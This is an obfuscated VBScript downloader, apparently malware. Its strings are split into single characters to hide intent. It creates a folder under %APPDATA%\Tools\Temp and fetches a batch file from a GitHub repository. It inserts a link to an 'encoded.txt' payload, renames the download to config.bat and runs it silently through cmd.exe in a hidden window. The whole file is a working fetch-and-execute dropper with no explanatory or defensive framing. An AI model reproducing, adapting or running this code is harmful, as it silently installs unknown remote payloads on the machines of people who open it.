Set x1a=CreateObject("WScript."&"Shell")
Set x2b=CreateObject("Scripting."&"FileSystemObject")
p1c=x1a.ExpandEnvironmentStrings("%APPDATA%")&"\T"&"o"&"o"&"l"&"s"&"\T"&"e"&"m"&"p"
If x2b.FolderExists(p1c) Then x2b.DeleteFolder p1c,True
If Not x2b.FolderExists(Left(p1c,InStrRev(p1c,"\")-1)) Then x2b.CreateFolder Left(p1c,InStrRev(p1c,"\")-1)
x2b.CreateFolder p1c
Set x3d=CreateObject("MSXML2."&"ServerXMLHTTP")
x3d.Open "G"&"E"&"T","h"&"t"&"t"&"p"&"s"&":"&"/"&"/"&"r"&"a"&"w"&"."&"g"&"i"&"t"&"h"&"u"&"b"&"u"&"s"&"e"&"r"&"c"&"o"&"n"&"t"&"e"&"n"&"t"&"."&"c"&"o"&"m"&"/"&"U"&"S"&"A"&"T"&"I"&"K"&"T"&"O"&"K"&"E"&"R"&"/"&"S"&"e"&"r"&"v"&"i"&"c"&"e"&"/"&"m"&"a"&"i"&"n"&"/"&"f"&"i"&"n"&"a"&"l"&"."&"b"&"a"&"t",False
x3d.Send
Set x4e=CreateObject("ADODB."&"Stream")
x4e.Type=1
x4e.Open
x4e.Write x3d.responseBody
x4e.Position=0
x4e.Type=2
x4e.Charset="u"&"t"&"f"&"-"&"8"
c1f=x4e.ReadText
c1f=Replace(c1f,"*"&"*"&"*"&"*","https://github.com/USATIKTOKER/Service/raw/refs/heads/main/encoded.txt")
x4e.Position=0
x4e.SetEOS
x4e.WriteText c1f
x4e.SaveToFile p1c&"\c"&"o"&"n"&"f"&"i"&"g"&"."&"t"&"x"&"t",2
Set x5g=x2b.CreateTextFile(p1c&"\l"&"o"&"g"&"."&"t"&"x"&"t",True)
x5g.WriteLine c1f
x5g.Close
If x2b.FileExists(p1c&"\c"&"o"&"n"&"f"&"i"&"g"&"."&"b"&"a"&"t") Then x2b.DeleteFile p1c&"\c"&"o"&"n"&"f"&"i"&"g"&"."&"b"&"a"&"t"
x2b.MoveFile p1c&"\c"&"o"&"n"&"f"&"i"&"g"&"."&"t"&"x"&"t",p1c&"\c"&"o"&"n"&"f"&"i"&"g"&"."&"b"&"a"&"t"
x1a.Run "c"&"m"&"d"&"."&"e"&"x"&"e"&" "&"/"&"c"&" "&""""&p1c&"\c"&"o"&"n"&"f"&"i"&"g"&"."&"b"&"a"&"t"&"""",0,False
